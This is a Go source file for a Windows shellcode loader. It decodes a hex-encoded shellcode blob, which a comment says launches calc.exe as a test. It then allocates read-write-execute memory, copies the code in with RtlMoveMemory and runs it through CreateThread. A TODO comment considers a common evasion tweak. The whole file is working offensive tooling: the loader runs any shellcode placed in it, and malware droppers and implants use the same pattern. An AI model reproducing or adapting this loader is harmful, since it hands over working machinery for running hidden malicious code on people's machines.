package loader

import (
	"encoding/hex"
	"errors"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

type Loader struct {
	shellcode   []byte
	ntdll       *windows.LazyDLL
	kernel32dll *windows.LazyDLL
}

// Pass shellcode
func NewLoader() (*Loader, error) {
	// TODO: delete after done testing
	// Exec calc.exe
	shellcodeDecoded, err := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if err != nil {
		return nil, err
	}

	return &Loader{
		shellcode:   shellcodeDecoded,
		ntdll:       windows.NewLazyDLL("ntdll.dll"),
		kernel32dll: windows.NewLazyDLL("kernel32.dll"),
	}, nil
}

func (l *Loader) Execute() error {
	// Allocate memory - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	addrPtr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(l.shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE) // TODO: Maybe changed to PAGE_READ_WRITE? and change with VirtualProtect?
	if err != nil {
		return err
	}

	if addrPtr == 0 {
		return errors.New("VirtualAlloc failed")
	}

	// Copy shellcode - https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
	rtlMoveMemory := l.ntdll.NewProc("RtlMoveMemory")
	_, _, err = rtlMoveMemory.Call(addrPtr, (uintptr)(unsafe.Pointer(&l.shellcode[0])), uintptr(len(l.shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		return err
	}

	// Create thread - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
	createThread := l.kernel32dll.NewProc("CreateThread")
	thread, _, err := createThread.Call(0, 0, addrPtr, uintptr(0), 0, 0)
	if err != nil && err.Error() != "The operation completed successfully." {
		return err
	}

	// Wait for the thread - https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
	returnEvent, err := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
	if err != nil {
		return err
	}

	log.Printf("%d", returnEvent)

	return nil
}
